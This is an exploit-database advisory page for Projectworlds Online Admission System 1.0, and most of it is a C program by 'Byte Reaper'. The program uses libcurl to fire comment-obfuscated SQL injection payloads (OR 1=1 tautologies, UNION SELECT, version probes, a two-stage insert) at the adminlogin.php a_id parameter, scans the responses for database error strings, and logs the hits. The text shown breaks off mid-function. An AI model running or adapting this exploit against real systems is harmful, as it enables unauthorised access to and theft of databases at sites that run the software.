---
title: Projectworlds Online Admission System 1.0 SQL Injection
url: https://cxsecurity.com/issue/WLB-2025080011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-08-12
fetch_date: 2025-10-07T00:12:42.326507
---

# Projectworlds Online Admission System 1.0 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Projectworlds Online Admission System 1.0 SQL Injection** **2025.08.11**  Credit:  **[Byte Reaper](https://cxsecurity.com/author/Byte%2BReaper/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

/\*
\* Title : projectworlds Online Admission System 1.0 - SQL Injection
\* Author : Byte Reaper
\* CVE : CVE-2025-8471
\*/
#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <stdlib.h>
#include "argparse.h"
#include <time.h>
#define FULL 2200
int verbose = 0;
int selCookie = 0;
const char \*cookies;
void sleepAssembly(void)
{
struct timespec s ;
s.tv\_sec = 0;
s.tv\_nsec = 500000000;
\_\_asm\_\_ volatile
(
"mov $35, %%rax\n\t"
"xor %%rsi, %%rsi\n\t"
"syscall\n\t"
:
: "D" (&s)
: "rax",
"rsi",
"memory"
);
}
void syscallLinux()
{
\_\_asm\_\_ volatile
(
"mov $0x3C, %%rax\n\t"
"xor %%rdi, %%rdi\n\t"
"syscall\n\t"
:
:
:"rax", "rdi"
);
}
struct Mem
{
char \*buffer;
size\_t len;
};
size\_t write\_cb(void \*ptr,
size\_t size,
size\_t nmemb,
void \*userdata)
{
size\_t total = size \* nmemb;
struct Mem \*m = (struct Mem \*)userdata;
char \*tmp = realloc(m->buffer, m->len + total + 1);
if (tmp == NULL)
{
fprintf(stderr, "\e[1;31m[-] Failed to allocate memory!\e[0m\n");
syscallLinux();
}
m->buffer = tmp;
memcpy(&(m->buffer[m->len]), ptr, total);
m->len += total;
m->buffer[m->len] = '\0';
return total;
}
int checkLen(int len, char \*buf, size\_t bufcap)
{
if (len < 0 || (size\_t)len >= bufcap)
{
printf("\e[0;31m[-] Len is Long ! \e[0m\n");
printf("\e[0;31m[-] Len %d\e[0m\n", len);
syscallLinux();
return 1;
}
else
{
printf("\e[0;34m[+] Len Is Not Long.\e[0m\n");
return 0;
}
return 0;
}
// Content Log File (Payload, url, full, http code response)
int logFile(const char \*payload, const char \*urlB, long httpCodeResponse,size\_t lenResponse)
{
FILE \*file = fopen("result.log", "a");
if (file == NULL)
{
printf("\e[0;31m[-] Error Create File (result.log)\e[0m\n");
syscallLinux();
return 1;
}
printf("\e[0;36m[+] Create Log File Successfully.\e[0m\n");
char content[1500];
int lenG = snprintf(content, sizeof(content), "[+] BASE URL : %s\n[+] PAYLOAD Injection : %s\n[+] http code Response %ld\n[+] Response Len : %zu\n\n", urlB, payload, httpCodeResponse, lenResponse);
if (checkLen(lenG,content , sizeof(content)) == 1)
{
printf("\e[0;31m[-] Len Content is Long !\e[0m\n");
syscallLinux();
return 1;
}
size\_t fw = fwrite(content, 1, strlen(content), file);
if (fw != strlen(content))
{
printf("\e[0;31m[-] Error Write Content in Log file !\e[0m\n");
syscallLinux();
}
printf("\e[0;36m[+] Write Log file Content Successfully.\e[0m\n");
fclose(file);
if (verbose)
{
printf("\e[0;33m[+] Close Log File...\e[0m\n");
}
return 0;
}
// Simple Two Stage Injection Payload
const char \*twoStageInjection[] =
{
"INSERT INTO stages (id,code) VALUES (3, 'UNION SELECT NULL --');",
"SELECT SLEEP(2);",
"SELECT code FROM stages WHERE id = 3;",
NULL
};
const char \*deepInjection\_Payload[] =
{
"'/\*\*/OR/\*\*/1=1--",
"'/\*\*/OR/\*\*/'a'='a'--",
"'/\*\*/OR/\*\*/1=1/\*\*/AND/\*\*/1=1--",
"'/\*\*/OR/\*\*/1=1/\*\*/AND/\*\*/'1'='1'--",
"\"/\*\*/OR/\*\*/1=1--",
"\"/\*\*/OR/\*\*/1=1/\*\*/AND/\*\*/'a'='a'--",
"'/\*\*/UNION/\*\*/SELECT/\*\*/NULL,NULL--",
"'/\*\*/AND/\*\*/1=1--",
"'/\*\*/AND/\*\*/1=2--",
"'/\*\*/AND/\*\*/'1'='1'--",
"'/\*\*/AND/\*\*/'1'='2'--",
"'/\*\*/AND/\*\*/EXISTS(SELECT/\*\*/1)--",
"'/\*\*/OR/\*\*/EXISTS(SELECT/\*\*/1)--",
"'/\*\*/OR/\*\*/1=1#",
"'/\*\*/OR/\*\*/1=1/\*",
"'/\*\*/AND/\*\*/1=1/\*",
"'/\*\*/AND/\*\*/1=2/\*",
"'/\*\*/OR/\*\*/1=2/\*",
"'/\*\*/AND/\*\*/SUBSTRING(@@version,1,1)='5'--",
"'/\*\*/AND/\*\*/SUBSTRING(@@version,1,1)='8'--",
"'/\*\*/OR/\*\*/LOWER(database())/\*\*/LIKE/\*\*/'%test%'--",
"'/\*\*/OR/\*\*/1=1/\*\*/ORDER/\*\*/BY/\*\*/1--",
NULL
};
const char \*wordSql[] =
{
"syntax error",
"you have an error in your sql syntax",
"warning",
"mysql\_fetch",
"mysql\_num\_rows",
"unclosed quotation mark",
"quoted string not properly terminated",
"sql syntax error",
"unexpected end of sql command",
"syntax error near",
"database error",
"query failed",
"error in your query",
"unknown column",
"cannot execute query",
"invalid query",
"mysql error",
"odbc sql",
"sqlstate",
"ora-",
"sql error",
"error occurred",
"mysql\_fetch\_array",
"native client",
"syntax error in string in query expression",
"Microsoft OLE DB Provider for SQL Server",
"error message",
"warning: mysql",
"You have an error in your SQL syntax",
NULL
};
const char \*\*allTechniques[] =
{
twoStageInjection,
deepInjection\_Payload,
NULL
};
size\_t payloadInject(const char \*urlP)
{
CURL \*curl = curl\_easy\_init();
CURLcode res;
struct Mem response;
response.buffer = NULL;
response.len = 0;
if (curl == NULL || !curl)
{
printf("\e[0;31m[-] Error Create Object CURL !\e[0m\n");
syscallLinux();
}
if
(curl)
{
char full[FULL];
for (int t = 0; allTechniques[t] != NULL; t++)
{
const char \*\*payloads = allTechniques[t];
printf("\e[0;35m\n[+] Technique %d:\e[0m\n", t);
for (int f = 0; payloads[f] != NULL; f++)
{
const char \*pl = payloads[f];
char \*encode = curl\_easy\_escape(curl,
payloads[f],
strlen(payloads[f]));
if (!encode)
{
printf("\e[0;31m[-] Error Encode Payload !\e[0m\n");
syscallLinux();
}
printf("\e[0;37m[+] Encode Payload : %s\e[0m\n", encode);
int lenF = snprintf(full,
sizeof(full),
"%s/adminlogin.php?a\_id=%s",urlP, encode);
if (checkLen(lenF, full,sizeof(full)) == 1)
{
printf("\e[0;31m[-] Len full URL is Long !\e[0m");
syscallLinux();
}
printf("\e[0;37m[+] Full URL : %s\e[0m\n", full);
curl\_easy\_setopt(curl,
CURLOPT\_URL,
full);
if (selCookie)
{
curl\_easy\_setopt(curl,
CURLOPT\_COOKIEFILE,
cookies);
curl\_easy\_setopt(curl,
CURLOPT\_COOKIEJAR,
cookies);
}
curl\_easy\_setopt(curl,
CURLOPT\_ACCEPT\_ENCODING,
"");
curl\_easy\_setopt(curl,
CURLOPT\_FOLLOWLOCATION,
1L);
curl\_easy\_setopt(curl,
CURLOPT\_WRITEFUNCTION,
write\_cb);
curl\_easy\_setopt(curl,
CURLOPT\_WRITEDATA,
&response);
curl\_easy\_setopt(curl,
CURLOPT\_CONNECTTIMEOUT,
5L);
sleepAssembly();
curl\_easy\_setopt(curl,
CURLOPT\_TIMEOUT,
10L);
curl\_easy\_setopt(curl,
CURLOPT\_SSL\_VERIFYPEER,
0L);
curl\_easy\_setopt(curl,
CURLO...